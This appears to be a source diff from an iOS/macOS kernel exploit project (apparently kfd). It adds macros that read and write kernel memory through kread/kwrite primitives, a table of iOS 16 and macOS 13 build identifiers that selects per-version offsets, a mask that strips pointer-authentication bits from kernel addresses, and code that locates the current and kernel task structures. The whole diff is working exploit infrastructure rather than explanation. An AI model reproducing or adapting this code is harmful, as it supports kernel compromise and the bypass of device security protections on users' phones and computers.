@@ -41,8 +41,96 @@
         *(volatile u64*)(field_uaddr) = (u64)(new_value);                  \
     } while (0)
 
-const char info_copy_sentinel[] = "p0up0u was here";
-const u64 info_copy_sentinel_size = sizeof(info_copy_sentinel);
+#include "info/dynamic_types/kqworkloop.h"
+#include "info/dynamic_types/proc.h"
+#include "info/dynamic_types/task.h"
+#include "info/dynamic_types/thread.h"
+#include "info/dynamic_types/uthread.h"
+#include "info/dynamic_types/vm_map.h"
+#include "info/dynamic_types/IOSurface.h"
+
+/*
+ * Helper macros for static types.
+ */
+
+#define static_sizeof(object) (sizeof(struct object))
+
+#define static_offsetof(object, field) (offsetof(struct object, field))
+
+#define static_uget(object, field, object_uaddr) (((volatile struct object*)(object_uaddr))->field)
+
+#define static_uset(object, field, object_uaddr, field_value)                  \
+    do {                                                                       \
+        (((volatile struct object*)(object_uaddr))->field = (field_value));    \
+    } while (0)
+
+#define static_kget(object, field_type, field, object_kaddr)                       \
+    ({                                                                             \
+        u64 buffer = 0;                                                            \
+        u64 field_kaddr = (u64)(object_kaddr) + static_offsetof(object, field);    \
+        kread((u64)(kfd), (field_kaddr), (&buffer), (sizeof(buffer)));             \
+        field_type field_value = *(field_type*)(&buffer);                          \
+        field_value;                                                               \
+    })
+
+#define static_kset_u64(object, field, object_kaddr, field_value)                  \
+    do {                                                                           \
+        u64 buffer = field_value;                                                  \
+        u64 field_kaddr = (u64)(object_kaddr) + static_offsetof(object, field);    \
+        kwrite((u64)(kfd), (&buffer), (field_kaddr), (sizeof(buffer)));            \
+    } while (0)
+
+#include "info/static_types/fileglob.h"
+#include "info/static_types/fileops.h"
+#include "info/static_types/fileproc_guard.h"
+#include "info/static_types/fileproc.h"
+#include "info/static_types/ipc_entry.h"
+#include "info/static_types/ipc_port.h"
+#include "info/static_types/ipc_space.h"
+#include "info/static_types/miscellaneous_types.h"
+#include "info/static_types/pmap.h"
+#include "info/static_types/pseminfo.h"
+#include "info/static_types/psemnode.h"
+#include "info/static_types/semaphore.h"
+#include "info/static_types/vm_map_copy.h"
+#include "info/static_types/vm_map_entry.h"
+#include "info/static_types/vm_named_entry.h"
+#include "info/static_types/vm_object.h"
+#include "info/static_types/vm_page.h"
+
+const u64 ios_16_0_a   = 0x0000373533413032; // 20A357
+const u64 ios_16_0_b   = 0x0000323633413032; // 20A362
+const u64 ios_16_0_1   = 0x0000313733413032; // 20A371
+const u64 ios_16_0_2   = 0x0000303833413032; // 20A380
+const u64 ios_16_0_3   = 0x0000323933413032; // 20A392
+const u64 ios_16_1     = 0x0000003238423032; // 20B82
+const u64 ios_16_1_1   = 0x0000313031423032; // 20B101
+const u64 ios_16_1_2   = 0x0000303131423032; // 20B110
+const u64 ios_16_2     = 0x0000003536433032; // 20C65
+const u64 ios_16_3     = 0x0000003734443032; // 20D47
+const u64 ios_16_3_1   = 0x0000003736443032; // 20D67
+const u64 ios_16_4     = 0x0000373432453032; // 20E247
+const u64 ios_16_4_1   = 0x0000323532453032; // 20E252
+const u64 ios_16_5     = 0x0000003636463032; // 20F66
+const u64 ios_16_5_1   = 0x0000003537463032; // 20F75
+
+const u64 macos_13_0   = 0x0000303833413232; // 22A380
+const u64 macos_13_0_1 = 0x0000303034413232; // 22A400
+const u64 macos_13_1   = 0x0000003536433232; // 22C65
+const u64 macos_13_2   = 0x0000003934443232; // 22D49
+const u64 macos_13_2_1 = 0x0000003836443232; // 22D68
+const u64 macos_13_3   = 0x0000323532453232; // 22E252
+const u64 macos_13_3_1 = 0x0000313632453232; // 22E261
+const u64 macos_13_4   = 0x0000003636463232; // 22F66
+
+//#define t1sz_boot (17ull)
+#define t1sz_boot (25ull)
+#define ptr_mask ((1ull << (64ull - t1sz_boot)) - 1ull)
+#define pac_mask (~ptr_mask)
+#define unsign_kaddr(kaddr) ((kaddr) | (pac_mask))
+
+const char copy_sentinel[16] = "p0up0u was here";
+const u64 copy_sentinel_size = sizeof(copy_sentinel);
 
 void info_init(struct kfd* kfd)
 {
@@ -83,19 +171,62 @@ void info_init(struct kfd* kfd)
     struct rlimit rlim = { .rlim_cur = kfd->info.env.maxfilesperproc, .rlim_max = kfd->info.env.maxfilesperproc };
     assert_bsd(setrlimit(RLIMIT_NOFILE, &rlim));
 
-    usize size2 = sizeof(kfd->info.env.kern_version);
-    assert_bsd(sysctlbyname("kern.version", &kfd->info.env.kern_version, &size2, NULL, 0));
-    print_string(kfd->info.env.kern_version);
-
-    const u64 number_of_kern_versions = sizeof(kern_versions) / sizeof(kern_versions[0]);
-    for (u64 i = 0; i < number_of_kern_versions; i++) {
-        const char* current_kern_version = kern_versions[i].kern_version;
-        if (!memcmp(kfd->info.env.kern_version, current_kern_version, strlen(current_kern_version))) {
-            kfd->info.env.vid = i;
-            print_u64(kfd->info.env.vid);
-            return;
+    usize size2 = sizeof(kfd->info.env.osversion);
+    assert_bsd(sysctlbyname("kern.osversion", &kfd->info.env.osversion, &size2, NULL, 0));
+    
+    if (@available(iOS 16, *)) {
+        switch (*(u64*)(&kfd->info.env.osversion)) {
+            case ios_16_3:
+            case ios_16_3_1: {
+                kfd->info.env.vid = 0;
+                kfd->info.env.ios = true;
+                break;
+            }
+            case ios_16_4:
+            case ios_16_4_1:
+            case ios_16_5:
+            case ios_16_5_1: {
+                kfd->info.env.vid = 1;
+                kfd->info.env.ios = true;
+                break;
+            }
+            case macos_13_1: {
+                kfd->info.env.vid = 2;
+                kfd->info.env.ios = false;
+                break;
+            }
+            case macos_13_4: {
+                kfd->info.env.vid = 3;
+                kfd->info.env.ios = false;
+                break;
+            }
+            default: {
+                assert_false("unsupported osversion");
+            }
         }
     }
+    else {
+        int ptrAuthVal = 0;
+        size_t len = sizeof(ptrAuthVal);
+        assert(sysctlbyname("hw.optional.arm.FEAT_PAuth", &ptrAuthVal, &len, NULL, 0) != -1);
+        
+        kfd->info.env.ios = true;
+        if (@available(iOS 15.4, *)) {
+            kfd->info.env.vid = 8;
+        }
+        else if (@available(iOS 15.2, *)) {
+            kfd->info.env.vid = 6;
+        }
+        else if (@available(iOS 15.0, *)) {
+            kfd->info.env.vid = 4;
+        }
+        
+        if (ptrAuthVal != 0) {
+            kfd->info.env.vid++;
+        }
+    }
+
+    
 
     assert_false("unsupported osversion");
 }
@@ -108,7 +239,8 @@ void info_run(struct kfd* kfd)
      * current_proc() and current_task()
      */
     assert(kfd->info.kaddr.current_proc);
-    kfd->info.kaddr.current_task = kfd->info.kaddr.current_proc + kfd_offset(proc__object_size);
+    u64 signed_task_kaddr = dynamic_kget(proc, task, kfd->info.kaddr.current_proc);
+    kfd->info.kaddr.current_task = unsign_kaddr(signed_task_kaddr);
     print_x64(kfd->info.kaddr.current_proc);
     print_x64(kfd->info.kaddr.current_task);
 
@@ -152,7 +284,8 @@ void info_run(struct kfd* kfd)
         /*
          * kernel_proc() and kernel_task()
          */
-        kfd->info.kaddr.kernel_task = kfd->info.kaddr.kernel_proc + kfd_offset(proc__object_size);
+        u64 signed_kernel_task = dynamic_kget(proc, task, kfd->info.kaddr.kernel_proc);
+        kfd->info.kaddr.kernel_task = unsign_kaddr(signed_kernel_task);
         print_x64(kfd->info.kaddr.kernel_proc);
         print_x64(kfd->info.kaddr.kernel_task);
 
